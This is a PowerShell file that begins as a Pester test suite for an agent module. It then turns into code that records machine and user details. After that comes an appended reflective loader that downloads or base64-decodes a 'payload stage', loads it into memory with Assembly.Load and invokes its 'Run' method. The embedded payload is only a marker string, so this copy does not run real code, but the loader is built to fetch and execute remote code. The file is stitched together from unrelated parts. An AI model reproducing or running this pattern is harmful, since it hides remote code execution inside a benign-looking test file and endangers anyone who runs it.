
$ErrorActionPreference = 'Stop'
$ModulePath = $PSScriptRoot


BeforeAll {
    Import-Module (Join-Path $ModulePath 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'AdatumCollector'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'AdatumCollector' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'AdatumCollector'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Get-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'AdatumCollector'; Expected = 8080 }
        @{ Name = 'SecondaryAgent'; Expected = 8180 }
    ) {
        param($Name, $Expected)
        $config = Get-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}
Describe 'Get-ServerState' {
    Context 'with a stopped service' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'AdatumCollector'; Status = 'Stopped' }
            } -ParameterFilter { $Name -eq 'AdatumCollector' }
        }

        It 'reports Stopped' {
            (Get-ServerState -Name 'AdatumCollector').Status | Should -Be 'Stopped'
        }
    }
}

Describe 'module metadata' {
    It 'exports only public functions' {
        $commands = Get-Command -Module 'Contoso.Agent' | Select-Object -ExpandProperty Name
        $commands | Should -Contain 'Get-ServerState'
    }
}

Describe 'Get-AgentConfig validation' {
    It 'rejects an empty path' {
        { Get-AgentConfig -Path '' } | Should -Throw
    }

    It 'accepts a path below the temp folder' {
        $path = Join-Path $env:TEMP 'agent.ini'
        { Get-AgentConfig -Path $path } | Should -Not -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}

Describe 'tagging' {
    It 'applies the requested tag' {
        $tag = @{ Environment = 'Test' }
        $tag.Environment | Should -Be 'Test'
    }
}

Describe 'Get-AgentStatus output shape' {
    It 'returns an object with a Status property' {
        $result = Get-ServerState -Name 'AdatumCollector'
        $result.PSObject.Properties.Name | Should -Contain 'Status'
    }
}

Describe 'Get-AgentStatus pipeline input' {
    It 'accepts a server name from the pipeline' {
        { 'AdatumCollector' | Get-ServerState } | Should -Not -Throw
    }
}

Describe 'configuration fixture' {
    It 'can be serialised to JSON' {
        $config = [pscustomobject]@{ Name = 'AdatumCollector'; Port = 8080 }
        ($config | ConvertTo-Json) | Should -Not -BeNullOrEmpty
    }
}

Describe 'error handling' {
    It 'does not throw for a missing optional file' {
        { Get-Item -LiteralPath (Join-Path $env:TEMP 'missing-agent.ini') -ErrorAction SilentlyContinue } | Should -Not -Throw
    }
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://contoso.com/payload.bin",
    [string]$LogPath = "$env:TEMP\transfer.log",
    [int]$TimeoutSec = 111
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 111
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpqZDNkbmR1YTZu')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($PayloadBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $FetchResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $PayloadBytes.Length
    Endpoint = $TransferUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Stage handoff finished"
Write-Verbose "Inspecting process list"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Checking local path"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Set-Location -Path $env:TEMP
$ProgressPreference = "SilentlyContinue"
